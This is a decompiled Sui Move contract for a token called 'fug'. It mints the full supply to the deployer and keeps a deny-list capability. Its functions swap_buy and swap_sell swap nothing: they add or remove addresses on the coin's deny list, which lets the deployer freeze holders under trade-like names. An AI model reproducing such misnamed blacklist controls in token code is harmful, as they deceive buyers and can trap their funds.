module 0xa5bb0f4a7b7468f37a480c39d031a554191314a1657dc5e6b83fd8a5c070d72c::fug {
    struct FUG has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FUG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FUG>(arg0, 9, b"fug", b"fug", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQa8WNs4gYpBZKsLKBWXSZcLxu7rUuksGouiAUXu6PxkH"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FUG>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FUG>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FUG>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FUG>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FUG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FUG>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FUG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FUG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

